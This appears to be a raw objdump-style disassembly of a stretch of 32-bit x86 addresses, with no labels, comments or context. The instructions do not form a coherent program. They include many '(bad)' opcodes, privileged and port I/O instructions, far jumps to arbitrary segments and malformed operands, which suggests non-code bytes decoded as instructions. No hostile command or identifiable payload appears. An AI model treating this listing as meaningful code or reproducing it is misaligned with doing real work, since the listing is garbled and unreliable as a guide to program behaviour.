  407a8a:	sbb    ax,0x4a13
  407a8e:	xchg   ecx,eax
  407a8f:	sahf   
  407a90:	mov    eax,ds:0x57c7129d
  407a95:	loope  0x407ac4
  407a97:	mov    eax,0x52b4ce64
  407a9c:	pop    ss
  407a9d:	jl     0x407a49
  407a9f:	outs   dx,BYTE PTR ds:[esi]
  407aa0:	jmp    0x60ee:0xaacded6c
  407aa7:	div    BYTE PTR [ebx-0x54b5cd7d]
  407aad:	rcl    DWORD PTR [ecx+ebx*4-0x1c],0x76
  407ab2:	fstp   TBYTE PTR [edx-0x26b7b7a5]
  407ab8:	mov    ah,BYTE PTR [ecx]
  407aba:	je     0x407aae
  407abc:	clc    
  407abd:	ret    
  407abe:	cmp    DWORD PTR [ecx+0x47c9b4d5],0xb699cf7c
  407ac8:	adc    eax,0x4976a863
  407acd:	fidivr DWORD PTR [eax]
  407acf:	leave  
  407ad0:	dec    edx
  407ad1:	xchg   ecx,eax
  407ad2:	push   esi
  407ad3:	in     eax,dx
  407ad4:	out    dx,al
  407ad5:	xor    DWORD PTR [ebx+0x54813e1a],ecx
  407adb:	and    eax,0x16321a72
  407ae0:	xor    ch,BYTE PTR [eax+edx*8]
  407ae3:	lods   eax,DWORD PTR ds:[esi]
  407ae4:	or     ebx,DWORD PTR [ecx-0x6dabcbd8]
  407aea:	mov    BYTE PTR [ebp+0x0],ch
  407aed:	or     eax,0x661d437f
  407af2:	jb     0x407b6b
  407af4:	dec    eax
  407af5:	shl    dh,cl
  407af7:	mov    esi,0xab181e21
  407afc:	test   BYTE PTR [edx],bl
  407afe:	test   ebx,edi
  407b00:	popa   
  407b01:	sbb    ch,0x1c
  407b04:	or     BYTE PTR [ecx],ch
  407b06:	pop    eax
  407b07:	loopne 0x407a8d
  407b09:	(bad)  [edx]
  407b0b:	test   DWORD PTR [edx+0x76],0xcdac5fbd
  407b12:	jno    0x407aca
  407b14:	out    dx,eax
  407b15:	sub    DWORD PTR [edx-0x10],ecx
  407b18:	mov    eax,0xac213dfb
  407b1d:	bound  edx,QWORD PTR [ebx]
  407b1f:	adc    al,0x43
  407b21:	scas   eax,DWORD PTR es:[edi]
  407b22:	cmp    BYTE PTR [ebx+0x43],0x8c
  407b26:	rcl    BYTE PTR [ebp-0x6],1
  407b29:	add    al,0x1b
  407b2b:	out    dx,eax
  407b2c:	pop    eax
  407b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2e:	xchg   edx,eax
  407b2f:	jle    0x407b8a
  407b31:	in     al,0x50
  407b33:	mov    DWORD PTR [edx],edx
  407b35:	daa    
  407b36:	test   bl,dl
  407b38:	scas   eax,DWORD PTR es:[edi]
  407b39:	xor    al,dh
  407b3b:	arpl   WORD PTR [edx],di
  407b3d:	test   BYTE PTR [eax-0x4b8edb17],al
  407b43:	cli    
  407b44:	adc    ecx,edx
  407b46:	cmp    cl,BYTE PTR [eax+0x3280ab4a]
  407b4c:	push   eax
  407b4d:	pop    edi
  407b4e:	lods   eax,DWORD PTR ds:[esi]
  407b4f:	jmp    0xaeb437fb
  407b54:	push   eax
  407b55:	push   0x8fd21389
  407b5a:	aam    0x59
  407b5c:	xor    eax,0x5369f096
  407b61:	push   ds
  407b62:	pop    ecx
  407b63:	test   DWORD PTR [ebx-0x56],ecx
  407b66:	ficomp WORD PTR [edi+0x518dba5f]
  407b6c:	and    BYTE PTR [ecx],0x36
  407b6f:	and    eax,0x9eafe160
  407b74:	leave  
  407b75:	adc    al,0x80
  407b77:	pop    DWORD PTR [esp+edx*4+0x4b]
  407b7b:	or     ah,BYTE PTR [ebp-0x28]
  407b7e:	popf   
  407b7f:	rcr    BYTE PTR [ebx],cl
  407b81:	cmp    DWORD PTR [edx+0x60c10afe],esi
  407b87:	sbb    eax,0xdc552b59
  407b8c:	pop    edi
  407b8d:	stos   DWORD PTR es:[edi],eax
  407b8e:	ror    BYTE PTR [esi],0x3d
  407b91:	arpl   WORD PTR ds:0xe83d4d15,bx
  407b97:	mov    edi,ds
  407b99:	jbe    0x407b8c
  407b9b:	xchg   BYTE PTR [ebx-0x73],bh
  407b9e:	cmp    DWORD PTR [ebp-0x5a],esp
  407ba1:	and    DWORD PTR [ecx],ebp
  407ba3:	fwait
  407ba4:	aad    0x23
  407ba6:	jae    0x407b9a
  407ba8:	daa    
  407ba9:	adc    al,0x2d
  407bab:	jmp    0xc067:0x8ca523e8
  407bb2:	hlt    
  407bb3:	sbb    BYTE PTR [ecx+eax*1+0x790b0f60],ah
  407bba:	jbe    0x407bec
  407bbc:	(bad)  [edi+edi*8+0x165801ea]
  407bc3:	shr    BYTE PTR [edx+0x34],1
  407bc6:	mov    al,0x96
  407bc8:	push   0x99349a05
  407bcd:	cmp    al,0x3a
  407bcf:	and    esp,ebx
  407bd1:	jp     0x407b53
  407bd3:	in     al,dx
  407bd4:	cmp    al,0x2b
  407bd6:	imul   ecx,DWORD PTR [edx+ebx*1],0x2eea1a22
  407bdd:	and    DWORD PTR [edx],0xa98f1412
  407be3:	fwait
  407be4:	push   ds
  407be5:	out    0xf8,al
  407be7:	xchg   BYTE PTR [edi+0x52],ah
  407bea:	xlat   BYTE PTR ds:[ebx]
  407beb:	mov    ds:0x217c9b85,eax
  407bf0:	lds    edi,FWORD PTR [edx+0x5dc37cdc]
  407bf6:	aad    0x4c
  407bf8:	mov    esp,0xaef82742
  407bfd:	xchg   ebx,eax
  407bfe:	or     dh,BYTE PTR [ecx+0x5483e854]
  407c04:	cmp    eax,0xdcd9fbed
  407c09:	xor    al,0xcb
  407c0b:	not    DWORD PTR [edx+0x8701c0f]
  407c11:	jge    0x407c2c
  407c13:	mov    cl,0xc
  407c15:	jbe    0x407c26
  407c17:	dec    ecx
  407c18:	fld    DWORD PTR [edx+0x6]
  407c1b:	sbb    BYTE PTR [ebx-0x44e38bdd],ch
  407c21:	add    cl,dh
  407c23:	sar    DWORD PTR [esi],0xd4
  407c26:	shl    ch,0xe6
  407c29:	mov    ss,WORD PTR [edx-0x25]
  407c2c:	mov    eax,ds:0x42e2b7
  407c31:	dec    edx
  407c32:	jmp    0x409f81
  407c37:	mov    al,0x4e
  407c39:	cmp    bh,ch
  407c3b:	mov    ds:0xc733738b,al
  407c40:	sbb    BYTE PTR ds:0xa48e03e6,cl
  407c46:	sbb    al,BYTE PTR [esi]
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	or     BYTE PTR [esi+0x79c83bc],al
  407c55:	xchg   edi,eax
  407c56:	iret   
  407c57:	jmp    ebp
  407c59:	adc    DWORD PTR [ebp-0x4f0c2b7a],esi
  407c5f:	mov    ch,0x43
  407c61:	or     al,0x9d
  407c63:	scas   eax,DWORD PTR es:[edi]
  407c64:	push   ds
  407c65:	add    dh,BYTE PTR [ebp-0x53]
  407c68:	fcomp  QWORD PTR [esi+0x278509b5]
  407c6e:	(bad)  
  407c70:	xchg   ecx,eax
  407c71:	mov    eax,0x8f428db5
  407c76:	jns    0x407c52
  407c78:	outs   dx,DWORD PTR ds:[esi]
  407c79:	call   0xd9fdca79
  407c7e:	and    edx,DWORD PTR [eax]
  407c80:	leave  
  407c81:	add    BYTE PTR [edi+0x1a],al
  407c84:	imul   edi
  407c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c87:	mov    dh,0x90
  407c89:	stc    
  407c8a:	push   edi
  407c8b:	int3   
  407c8c:	pop    eax
  407c8d:	cmp    DWORD PTR [esi],esp
  407c8f:	test   BYTE PTR [ebp-0x3e],bl
  407c92:	jecxz  0x407c45
  407c94:	xor    al,0xc2
  407c96:	bound  edx,QWORD PTR [eax]
  407c98:	test   DWORD PTR [edx+0x7724a9e2],0x5e8c826d
  407ca2:	nop
  407ca3:	mov    edi,0xaa96c065
  407ca8:	std    
  407ca9:	push   eax
  407caa:	pop    ebp
  407cab:	mov    ds:0x155451fd,al
  407cb0:	jmp    0x407c4c
  407cb2:	into   
  407cb3:	popf   
  407cb4:	and    DWORD PTR ds:0x4f826bfc,esp
  407cba:	aaa    
  407cbb:	cld    
  407cbc:	in     al,dx
  407cbd:	data16 jp 0x407cb7
  407cc0:	inc    edx
  407cc1:	das    
  407cc2:	pop    ds
  407cc3:	push   esp
  407cc4:	mov    BYTE PTR [eax],ah
  407cc6:	out    dx,al
  407cc7:	sbb    BYTE PTR [ebp+0x157328c2],dh
  407ccd:	mov    dl,BYTE PTR [ebx+0x7]
  407cd0:	retf   
  407cd1:	mov    BYTE PTR [ebx],bh
  407cd3:	push   edx
  407cd4:	sub    eax,0x18f47c25
  407cd9:	jnp    0x407d32
  407cdb:	sub    edx,edi
  407cdd:	mov    fs,WORD PTR [ecx*2+0x9252c04]
  407ce4:	fs xor ebp,ebp
  407ce7:	mov    edx,0x355ea936
  407cec:	out    0xf2,al
  407cee:	in     eax,dx
  407cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cf0:	es inc esi
  407cf2:	sbb    BYTE PTR [ecx-0x7aecc02],dh
  407cf8:	popa   
  407cf9:	mov    al,ds:0x293288cc
  407cfe:	sub    al,BYTE PTR [edx+ebp*2+0x75]
  407d02:	repnz test DWORD PTR [esi+0x1802a483],edx
  407d09:	pop    eax
  407d0a:	dec    eax
  407d0b:	fdiv   st,st(2)
  407d0d:	fdiv   QWORD PTR [edx-0x52d82c23]
  407d13:	pop    ecx
  407d14:	push   ss
  407d15:	or     dl,BYTE PTR [ebx+0x2f]
  407d18:	sbb    eax,0x3f37919f
  407d1d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407d1f:	dec    edx
  407d20:	in     al,dx
  407d21:	nop    DWORD PTR [edx]
  407d24:	jo     0x407d7e
  407d26:	cmp    ebx,DWORD PTR es:[ecx+esi*1+0x62afc523]
  407d2e:	pusha  
  407d2f:	sbb    sp,WORD PTR [ebp-0x4d1669d8]
  407d36:	adc    BYTE PTR [edx+0x1b],al
  407d39:	ret    
  407d3a:	leave  
  407d3b:	lds    edi,FWORD PTR [ecx]
  407d3d:	out    0x1,eax
  407d3f:	cld    
  407d40:	xor    al,0xb9
  407d42:	and    eax,0x44d90d44
  407d47:	bound  eax,QWORD PTR [edx-0x4b]
  407d4a:	cmp    eax,0x3b0a2738
  407d4f:	test   eax,0x39045c4e
  407d54:	jp     0x407d1c
  407d56:	jbe    0x407d6f
  407d58:	push   ecx
  407d59:	call   0x3caa:0x413f870f
  407d60:	push   edx
  407d61:	jbe    0x407d0b
  407d63:	mov    edi,0x58a8c427
  407d68:	cld    
  407d69:	mov    ebp,0xe568b209
  407d6e:	pop    ebx
  407d6f:	or     BYTE PTR [edi+0x5b],bh
  407d72:	std    
  407d73:	push   0xfe330df3
  407d78:	popa   
  407d79:	out    0x4e,eax
  407d7b:	pop    ebx
  407d7c:	dec    ecx
  407d7d:	(bad)  
  407d7e:	adc    eax,DWORD PTR [ecx-0x7e]
  407d81:	rcl    ebx,1
  407d83:	and    DWORD PTR [edx-0x6a],esi
  407d86:	jle    0x407d50
  407d88:	push   edx
  407d89:	ds leave 
  407d8b:	ja     0x407d48
  407d8d:	enter  0xd30c,0xfb
  407d91:	sub    dl,BYTE PTR [edx+eiz*4-0x46]
  407d95:	ficomp DWORD PTR [esi+0x5e5b8969]
  407d9b:	sbb    ebp,DWORD PTR [ecx-0x23f60bf]
  407da1:	fs ja  0x407d8c
  407da4:	pop    es
  407da5:	loop   0x407df4
  407da7:	jne    0x407da9
  407da9:	ret    0x73f3
  407dac:	outs   dx,DWORD PTR ds:[esi]
  407dad:	adc    al,0x43
  407daf:	push   cs
  407db0:	add    eax,0xde2ee684
  407db5:	dec    esi
  407db6:	rol    BYTE PTR [ecx+0x3c],cl
  407db9:	xchg   BYTE PTR [ebx+0x4a],ah
  407dbc:	lea    ecx,[ebp+edx*4+0x1d]
  407dc0:	scas   eax,DWORD PTR es:[edi]
  407dc1:	loop   0x407d73
  407dc3:	push   es
  407dc4:	sub    edi,DWORD PTR [edi+ebx*1-0x70be28d]
  407dcb:	jmp    0xe039dd10
  407dd0:	(bad)  
  407dd1:	mov    esi,0xc5e716f3
  407dd6:	inc    esp
  407dd7:	mov    edx,ecx
  407dd9:	clts   
  407ddb:	pop    edi
  407ddc:	and    al,BYTE PTR [edx+0x503c1f99]
  407de2:	dec    esp
  407de3:	and    bl,BYTE PTR [edi+0x35419ae9]
  407de9:	and    al,0xb1
  407deb:	push   eax
  407dec:	mov    ebp,0x396f591
  407df1:	jbe    0x407e63
  407df3:	dec    eax
  407df4:	out    dx,eax
  407df5:	iret   
  407df6:	dec    eax
  407df7:	(bad)  
  407df8:	imul   ebx,DWORD PTR [eiz*4-0x709f7ea6],0x68
  407e00:	mov    dh,0xb8
  407e02:	mov    esp,DWORD PTR [edx]
  407e04:	dec    ebx
  407e05:	call   0xa784a6ba
  407e0a:	jle    0x407dd9
  407e0c:	imul   BYTE PTR ds:0xdb474b4
  407e12:	es inc eax
  407e14:	dec    esi
  407e15:	cmp    bl,BYTE PTR [esi]
  407e17:	pop    ebp
  407e18:	adc    DWORD PTR [edi+0x37],edi
  407e1b:	push   esi
  407e1c:	mov    al,ds:0x2f73f1d3
  407e21:	shr    al,cl
  407e23:	mov    ss,WORD PTR [ebx+eax*2-0x40]
  407e27:	das    
  407e28:	or     BYTE PTR [ecx+0x135651a1],cl
  407e2e:	mov    BYTE PTR [esi+0x1d11a552],cl
  407e34:	and    ch,ch
  407e36:	push   0x46e13b55
  407e3b:	xlat   BYTE PTR ds:[ebx]
  407e3c:	jp     0x407e60
  407e3e:	xchg   ebp,eax
  407e3f:	dec    edi
  407e40:	cmp    al,0xb3
  407e42:	add    esp,edx
  407e44:	jp     0x407ddd
  407e46:	cs dec eax
  407e48:	xchg   ebx,eax
  407e49:	push   ecx
  407e4a:	sti    
  407e4b:	test   al,0x39
  407e4d:	sbb    DWORD PTR [eax+0x34],ebx
  407e50:	test   al,0x68
  407e52:	cmp    bl,0x35
  407e55:	mov    ds:0xb8842409,eax
  407e5a:	leave  
  407e5b:	test   DWORD PTR [eiz*1-0x6d8cf2f7],eax
  407e62:	sbb    DWORD PTR [edx+0x5d864dae],esp
  407e68:	test   DWORD PTR [edi],ebx
  407e6a:	bound  eax,QWORD PTR [ecx+edi*4+0x27]
  407e6e:	int    0x50
  407e70:	adc    edx,ebx
  407e72:	test   BYTE PTR [eax-0x8],bh
  407e75:	call   0x69ba:0xc1ccc501
  407e7c:	push   ss
  407e7d:	mov    al,0x46
  407e7f:	xor    al,BYTE PTR [eax+0xb]
  407e82:	cdq    
  407e83:	jmp    0x7933b99
  407e88:	(bad)  
  407e89:	dec    ebx
  407e8a:	and    dh,BYTE PTR [ebx+edi*8]
  407e8d:	and    DWORD PTR [edi+0x0],ecx
  407e90:	sub    DWORD PTR [esi-0x2d326c80],ecx
  407e96:	mov    bh,0x64
  407e98:	mov    al,ds:0x634b5732
  407e9d:	add    DWORD PTR [ecx+eax*4],ebx
  407ea0:	push   DWORD PTR [ebp+0x4e5c4824]
  407ea6:	data16 jnp 0x407ee0
  407ea9:	ror    BYTE PTR [ebx-0x11804c2f],0xff
  407eb0:	lods   eax,DWORD PTR ds:[esi]
  407eb1:	jl     0x407e91
  407eb3:	test   eax,esi
  407eb5:	xor    eax,0xb271e2ab
  407eba:	adc    DWORD PTR ds:0x21bbcf4c,0xffffff9f
  407ec1:	outs   dx,BYTE PTR ds:[esi]
  407ec2:	add    dh,bh
  407ec4:	add    eax,0x4eeec6c9
  407ec9:	dec    ebx
  407eca:	push   ebp
  407ecb:	jmp    0xd6cf7103
  407ed0:	stos   BYTE PTR es:[edi],al
  407ed1:	(bad)  
  407ed2:	js     0x407e5f
  407ed4:	pusha  
  407ed5:	mov    al,ds:0xd8c645b4
  407eda:	jmp    0x9a30409b
  407edf:	retf   0xf767
  407ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee3:	or     BYTE PTR cs:[ebp+0x4235e7c8],cl
  407eea:	lds    esp,FWORD PTR [edx]
  407eec:	mov    eax,ds:0x9adcc5e7
  407ef1:	add    eax,0x2e3224ff
  407ef6:	pop    es
  407ef7:	jbe    0x407f76
  407ef9:	scas   eax,DWORD PTR es:[edi]
  407efa:	push   ss
  407efb:	sbb    esp,ebp
  407efd:	out    dx,eax
  407efe:	cmp    DWORD PTR [esi-0xc4e7e1f],eax
  407f04:	jno    0x407ebb
  407f06:	dec    esi
  407f07:	pop    esi
  407f08:	xor    BYTE PTR [ebx+0x7b48b2bb],0x86
  407f0f:	xchg   esp,eax
  407f10:	dec    ebx
  407f11:	dec    edi
  407f12:	pop    esp
  407f13:	fcomp  st(4)
  407f15:	popa   
  407f16:	cmp    ecx,esp
  407f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f19:	lds    esp,FWORD PTR [eax+0x8accb24]
  407f1f:	inc    edx
  407f20:	ss test al,0xc2
  407f23:	data16 cmp al,0x98
  407f26:	mov    eax,ds:0xd1a9dc0a
  407f2b:	scas   al,BYTE PTR es:[edi]
  407f2c:	push   es
  407f2d:	retf   
  407f2e:	in     al,dx
  407f2f:	xchg   esp,eax
  407f30:	(bad)  
  407f31:	int    0x18
  407f33:	push   ecx
  407f34:	add    BYTE PTR [edi-0x6b56a7ac],bh
  407f3a:	ficomp DWORD PTR [ebp+0x68ce555f]
  407f40:	fistp  WORD PTR [ebx]
  407f42:	xchg   ecx,eax
  407f43:	arpl   WORD PTR [edx],bp
  407f45:	cmp    dh,BYTE PTR [edx-0x75710337]
  407f4b:	stos   DWORD PTR es:[edi],eax
  407f4c:	sub    DWORD PTR [edi],ebx
  407f4e:	dec    esi
  407f4f:	jo     0x407fb4
  407f51:	retf   0x1757
  407f54:	icebp  
  407f55:	retf   
  407f56:	(bad)  
  407f57:	add    BYTE PTR [ecx+0x76a4c0fe],al
  407f5d:	sahf   
  407f5e:	fwait
  407f5f:	dec    edi
  407f60:	dec    eax
  407f61:	ret    
  407f62:	idiv   dh
  407f64:	adc    DWORD PTR [ebx-0x56],ebx
  407f67:	xlat   BYTE PTR ds:[ebx]
  407f68:	fisub  WORD PTR [esi]
  407f6a:	stos   DWORD PTR es:[edi],eax
  407f6b:	xchg   ebx,eax
  407f6c:	addr16 int 0xcf
  407f6f:	add    DWORD PTR [eax+ecx*8],esi
  407f72:	add    bh,0x65
  407f75:	xchg   ebx,eax
  407f76:	adc    DWORD PTR [ecx+0x23],edi
  407f79:	push   es
  407f7a:	iret   
  407f7b:	(bad)  
  407f7c:	mov    WORD PTR [ebx],?
  407f7e:	sti    
  407f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f80:	shr    DWORD PTR [ecx+0x5909b6f3],cl
  407f86:	loope  0x407f5b
  407f88:	in     al,dx
  407f89:	lods   al,BYTE PTR ds:[esi]
  407f8a:	popf   
  407f8b:	mov    bh,0xe8
  407f8d:	xor    eax,DWORD PTR [esi]
  407f8f:	mov    eax,0xfbee260f
  407f94:	or     bl,BYTE PTR ds:0x869b541e
  407f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9b:	or     BYTE PTR [ebp+0x6d],bh
  407f9e:	jmp    0x407f29
  407fa0:	or     eax,0xf8370652
  407fa5:	sti    
  407fa6:	xor    eax,0x60e6bce3
  407fab:	in     eax,0x51
  407fad:	lods   eax,DWORD PTR ds:[esi]
  407fae:	xlat   BYTE PTR ds:[ebx]
  407faf:	xchg   esp,ecx
  407fb1:	jmp    0x4bb6:0x546ca3b1
  407fb8:	fiadd  DWORD PTR [ecx-0x1]
  407fbb:	push   eax
  407fbc:	stc    
  407fbd:	ins    DWORD PTR es:[edi],dx
  407fbe:	pop    ss
  407fbf:	in     al,dx
  407fc0:	rcr    DWORD PTR [edx-0x55ebbb7],1
  407fc6:	frstor [edi+0x2d]
  407fc9:	out    0xba,eax
  407fcb:	cmp    eax,0x5a79b2f8
  407fd0:	sub    bh,cl
  407fd2:	jecxz  0x407f5c
  407fd4:	std    
  407fd5:	jl     0x408047
  407fd7:	fild   DWORD PTR [edx+ebx*1+0x4d392a63]
  407fde:	lods   eax,DWORD PTR ds:[esi]
  407fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe0:	pop    es
  407fe1:	ins    DWORD PTR es:[edi],dx
  407fe2:	aaa    
  407fe3:	mov    edx,0x19470bcb
  407fe8:	es repz pop eax
  407feb:	mov    dh,0xe
  407fed:	shl    DWORD PTR [edx],0x38
  407ff0:	xlat   BYTE PTR ds:[ebx]
  407ff1:	ror    BYTE PTR [edx+0x67],cl
  407ff4:	pop    ecx
  407ff5:	idiv   DWORD PTR [eax-0x63]
  407ff8:	test   DWORD PTR [ecx+0x42],esp
  407ffb:	sub    BYTE PTR [edi-0x76],cl
  407ffe:	mov    ah,0xe2
  408000:	mov    ebx,0x3d7718c3
  408005:	jg     0x408071
  408007:	fxch   st(0)
  408009:	inc    ebx
  40800a:	lods   al,BYTE PTR ds:[esi]
  40800b:	imul   ebp,DWORD PTR [edx-0x50],0x2a742cd6
  408012:	mov    bl,BYTE PTR [ecx]
  408014:	ds pushf 
  408016:	mov    eax,ds:0x8b4ee267
  40801b:	sub    BYTE PTR [ebx+0x75],ch
  40801e:	ins    BYTE PTR es:[edi],dx
  40801f:	cmp    bl,cl
  408021:	mov    dl,0xb8
  408023:	push   cs
  408024:	mov    bh,0xf1
  408026:	inc    esp
  408027:	or     bl,BYTE PTR [edi-0x139edc1c]
  40802d:	mov    ebx,0x205f6fd6
  408032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408033:	jbe    0x40808e
  408035:	push   ss
  408036:	aas    
  408037:	iret   
  408038:	aam    0x2d
  40803a:	pop    ecx
  40803b:	les    ebx,FWORD PTR [ecx+edx*1-0x16]
  40803f:	add    DWORD PTR [edx],edx
  408041:	test   esi,0x5d713ee4
  408047:	iret   
  408048:	fsubr  DWORD PTR [ecx-0x13]
  40804b:	leave  
  40804c:	jg     0x408050
  40804e:	lds    esp,FWORD PTR ds:0x97a77747
  408054:	jbe    0x408048
  408056:	ja     0x408002
  408058:	jmp    FWORD PTR ds:0x82834c32
  40805e:	mov    ebx,0xd9a059f1
  408063:	ds loopne 0x408008
  408066:	fmul   QWORD PTR [ebx]
  408068:	lods   al,BYTE PTR ds:[esi]
  408069:	push   ebx
  40806a:	stos   DWORD PTR es:[edi],eax
  40806b:	cwde   
  40806c:	iret   
  40806d:	pop    edx
  40806e:	fstp   QWORD PTR [edi-0x24d7948]
  408074:	ins    BYTE PTR es:[edi],dx
  408075:	mov    esp,0x665544fa
  40807a:	xchg   edi,eax
  40807b:	xor    cl,BYTE PTR [esi+0x4e3af6ce]
  408081:	add    ecx,esp
  408083:	(bad)  
  408084:	cld    
  408085:	cdq    
  408086:	inc    edi
  408087:	and    dh,ch
  408089:	dec    ebx
  40808a:	mov    ch,0x63
  40808c:	mov    eax,0x94f94b1c
  408091:	stos   DWORD PTR es:[edi],eax
  408092:	dec    ebx
  408093:	sub    al,0x81
  408095:	push   es
  408096:	add    esp,DWORD PTR [esp+esi*2-0x61]
  40809a:	push   ds
  40809b:	hlt    
  40809c:	aam    0xf1
  40809e:	nop
  40809f:	test   eax,0x86820104
  4080a4:	rol    BYTE PTR [esp+edi*8],cl
  4080a7:	cmp    ebp,DWORD PTR [edi]
  4080a9:	loop   0x40809c
  4080ab:	les    eax,FWORD PTR [ebp+0x10]
  4080ae:	push   ecx
  4080af:	cmp    eax,0xb9457876
  4080b4:	mov    cr7,esi
  4080b7:	add    edi,DWORD PTR [esi-0x27ca23c]
  4080bd:	mov    ?,WORD PTR [edi]
  4080bf:	and    eax,0xc987976c
  4080c4:	aas    
  4080c5:	popa   
  4080c6:	hlt    
  4080c7:	clc    
  4080c8:	jbe    0x408094
  4080ca:	or     DWORD PTR ds:0x5c55be95,esi
  4080d0:	mov    ch,0xfb
  4080d2:	pop    ebp
  4080d3:	(bad)  
  4080d4:	fisttp WORD PTR [edx]
  4080d6:	push   ecx
  4080d7:	mov    BYTE PTR [ebp+0x28],ah
  4080da:	jns    0x408118
  4080dc:	push   ebp
  4080dd:	addr16 int 0x22
  4080e0:	cmp    bh,ch
  4080e2:	ss jle 0x408075
  4080e5:	test   DWORD PTR [edi-0x7c],eax
  4080e8:	jecxz  0x40812e
  4080ea:	into   
  4080eb:	adc    BYTE PTR [esi],ah
  4080ed:	mov    edi,0x35ade2bb
  4080f2:	hlt    
  4080f3:	mov    ch,bl
  4080f5:	sbb    BYTE PTR [edx-0x4a240115],ah
  4080fb:	mov    ch,0xac
  4080fd:	sar    edx,cl
  4080ff:	dec    ecx
  408100:	xlat   BYTE PTR ds:[ebx]
  408101:	fist   DWORD PTR [ebx]
  408103:	xchg   ecx,eax
  408104:	inc    ebx
  408105:	add    dl,BYTE PTR [edx]
  408107:	stos   DWORD PTR es:[edi],eax
  408108:	in     al,dx
  408109:	sub    BYTE PTR [eax+0x2d],dh
  40810c:	and    DWORD PTR [edx+esi*4+0x40f380db],esp
  408113:	and    DWORD PTR [ecx+0x5bdf839c],esi
  408119:	cmp    eax,0xa4446b52
  40811e:	leave  
  40811f:	retf   
  408120:	or     dh,BYTE PTR [edx+0x7a]
  408123:	fwait
  408124:	jmp    FWORD PTR [ecx]
  408126:	pop    ebx
  408127:	cmp    al,0xb6
  408129:	adc    esi,esi
  40812b:	les    ecx,FWORD PTR [ecx+0x57b7c27e]
  408131:	push   ds
  408132:	loope  0x4080c7
  408134:	xchg   esi,eax
  408135:	mov    ds:0x1f847c38,eax
  40813a:	lea    edi,[esi+0x5ac46ede]
  408140:	inc    esp
  408141:	call   0x1944:0xe58fb78d
  408148:	stos   DWORD PTR es:[edi],eax
  408149:	ret    0x76a5
  40814c:	jae    0x408187
  40814e:	sbb    ecx,DWORD PTR [edx-0x2e]
  408151:	enter  0x9986,0xea
  408155:	outs   dx,BYTE PTR ds:[esi]
  408156:	dec    edx
  408157:	sti    
  408158:	push   0x892bf9a7
  40815d:	lds    ebx,FWORD PTR [ecx-0x3209afb6]
  408163:	push   ebx
  408164:	push   ebx
  408165:	xor    eax,0x32557fba
  40816a:	loop   0x4081a3
  40816c:	inc    edi
  40816d:	dec    ebx
  40816e:	add    esp,DWORD PTR [ebx]
  408170:	mov    ecx,0x7f256806
  408175:	push   cs
  408176:	test   eax,0x1d80dd4f
  40817b:	jg     0x4081f3
  40817d:	mov    al,0xc0
  40817f:	hlt    
  408180:	add    BYTE PTR [eax-0x4e3fbfd7],bl
  408186:	inc    edx
  408187:	inc    ebp
  408188:	push   ebp
  408189:	sub    BYTE PTR [esp+edx*8+0x5],bl
  40818d:	sbb    BYTE PTR [ebx+0x2a],bl
  408190:	cmp    dl,bh
  408192:	mov    DWORD PTR [esi],ebx
  408194:	mov    al,0xc8
  408196:	xchg   ebp,eax
  408197:	popa   
  408198:	inc    ebp
  408199:	push   esi
  40819a:	pop    edx
  40819b:	adc    esp,edi
  40819d:	or     ch,bl
  40819f:	cmc    
  4081a0:	jno    0x408180
  4081a2:	scas   al,BYTE PTR es:[edi]
  4081a3:	xchg   esi,eax
  4081a4:	jmp    0x408209
  4081a6:	sbb    eax,0xd34b94e9
  4081ab:	mov    eax,0x9daff52e
  4081b0:	dec    edi
  4081b1:	sbb    DWORD PTR [edx],esp
  4081b3:	pop    ebp
  4081b4:	ror    ebx,0xe3
  4081b7:	adc    esp,ebp
  4081b9:	mov    edi,0x98cd9f95
  4081be:	push   cs
  4081bf:	fmul   st(4),st
  4081c1:	pop    ebp
  4081c2:	xor    ebp,DWORD PTR [ecx-0x66]
  4081c5:	in     al,0x93
  4081c7:	push   edx
  4081c8:	or     bl,BYTE PTR [ecx+0x6ca18951]
  4081ce:	cmp    DWORD PTR [ebp-0x644b2cb3],esp
  4081d4:	adc    bh,BYTE PTR [ecx-0x3f8b1f4e]
  4081da:	xchg   cl,cl
  4081dc:	or     DWORD PTR [ecx-0x35827c5e],esp
  4081e2:	rcr    edi,cl
  4081e4:	cmp    ecx,DWORD PTR [esi-0x67c11bfe]
  4081ea:	pop    ss
  4081eb:	add    ecx,ecx
  4081ed:	cli    
  4081ee:	test   eax,0x1fa77bb7
  4081f3:	add    cl,BYTE PTR [ecx]
  4081f5:	and    al,0xe3
  4081f7:	fwait
  4081f8:	jle    0x4081af
  4081fa:	cmc    
  4081fb:	add    al,BYTE PTR [ebx-0x2a384b4d]
  408201:	mov    ds:0x3efe5aed,eax
  408206:	mov    edi,0xf0b74611
  40820b:	out    0xb3,eax
  40820d:	leave  
  40820e:	mov    cl,0xd5
  408210:	xlat   BYTE PTR ds:[ebx]
  408211:	mov    dl,0x4d
  408213:	cmp    esi,edx
  408215:	mov    cl,0xe0
  408217:	mov    ah,0x7c
  408219:	add    ebx,DWORD PTR [edi]
  40821b:	idiv   DWORD PTR [edx]
  40821d:	cmp    ch,BYTE PTR [ebx-0x2718c052]
  408223:	jl     0x4081f7
  408225:	dec    ebp
  408226:	adc    DWORD PTR [ebx+0x7d439002],edi
  40822c:	cdq    
  40822d:	xchg   BYTE PTR [eax+ebp*1-0x19f7cd6a],dl
  408234:	add    eax,0x49f2e699
  408239:	ins    BYTE PTR es:[edi],dx
  40823a:	adc    eax,0x11f0ef9f
  40823f:	hlt    
  408240:	push   esi
  408241:	or     dh,dh
  408243:	sub    DWORD PTR [ebx+0x5e],0xfe5d48a2
  40824a:	pop    edi
  40824b:	jge    0x408248
  40824d:	(bad)  
  40824f:	mov    ebp,0xf50af0c4
  408254:	lea    esi,[ecx-0x4266c59f]
  40825a:	inc    eax
  40825b:	pop    ebx
  40825c:	mov    ds:0x5500d68e,al
  408261:	xchg   ecx,eax
